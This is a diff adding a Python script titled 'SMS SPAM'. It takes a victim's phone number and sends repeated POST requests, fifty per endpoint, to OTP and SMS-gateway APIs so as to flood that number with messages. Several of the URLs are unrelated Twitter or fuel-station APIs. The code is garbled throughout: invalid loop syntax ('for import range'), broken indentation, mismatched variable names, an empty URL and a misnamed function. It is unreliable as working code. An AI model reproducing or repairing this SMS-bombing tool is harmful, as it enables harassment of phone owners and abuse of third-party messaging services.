@@ -1,0 +1,120 @@
+import requests
+import gratient
+from time import sleep
+
+banner = """ SHOO X HUB """"
+print(gratient.green(banner))
+def main():"SMS SPAM"
+    PHONE = input("PHONE: ")
+    aaa ={"user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
+    }
+    def api1():
+        asd = requests.post("https://api2.1112.com/api/v1/otp/create",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+
+    for import range(50):
+        api1()
+
+    def api2():
+        asd = requests.post("https://api.twitter.com/1.1/followers/ids.json",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+
+    for import range(50):
+        api2()
+
+    def api3():
+        asd = requests.post("https://api.twitter.com/1.1/followers/ids.json?cursor=-1&screen_name=andypiper&count=5000",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+         
+    for import range(50):
+        api3()
+
+    def api4():
+        asd = requests.post("'https://api.twitter.com/1.1/followers/ids.json?screen_name=twitterdev",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+
+         
+    for import range(50):
+        api4()
+
+    def api5():
+        asd = requests.post("https://developer.nrel.gov/api/alt-fuel-stations/v1/nearest.json?api_key=XXXXXXXXX&location=Denver+CO",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+    
+         
+    for import range(50):
+        api5()
+
+    def api6():
+        asd = requests.post("'https://twilio-sms.p.rapidapi.com/2010-04-01/Account",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+    
+    for import range(50):
+        api6()
+
+    def api7():
+        asd = requests.post("https://telesign-telesign-send-sms-verification-code-v1.p.rapidapi.com/sms-verification-code",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+    
+    for import range(50):
+        api7()
+
+    def api8():
+        asd = requests.post("https://nexmo-nexmo-messaging-v1.p.rapidapi.com/send-sms",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+    
+    for import range(50):
+        api8()
+
+    def api9():
+        asd = requests.post("https://d7sms.p.rapidapi.com/secure/sendbatch",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+          
+    for import range(50):
+        api9()
+
+    def api10():
+        asd = requests.post("https://telnyxstefan-skliarovv1.p.rapidapi.com/addCommentToPortRequest",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+           
+    for import range(50):
+        api10()
+
+    def api11():
+        asd = requests.post("",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+    
+    for import range(50):
+        api11()
+
+    def api12():
+        asd = requests.post("https://messagebird-sms-gateway.p.rapidapi.com/sms",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+
+    for import range(50):
+        api12()
+
+    def api13():
+        asd = requests.post("https://inteltech.p.rapidapi.com/credit.php",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+    
+     for import range(50):
+        api13()
+
+    def ap14i():
+        asd = requests.post("https://inteltech.p.rapidapi.com/credit.php",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+
+    for import range(50):
+        api14()
+
+    def api15():
+        asd = requests.post("https://nexmo-nexmo-sms-verify-v1.p.rapidapi.com/check-verification-code",headers=aaa, json={"language": "th", "phonenumber": phone}) 
+         print(asd.status_code)
+
+        for import range(50):
+        api15()
+
+if name == "SMS SPAM":
+    main()
+    
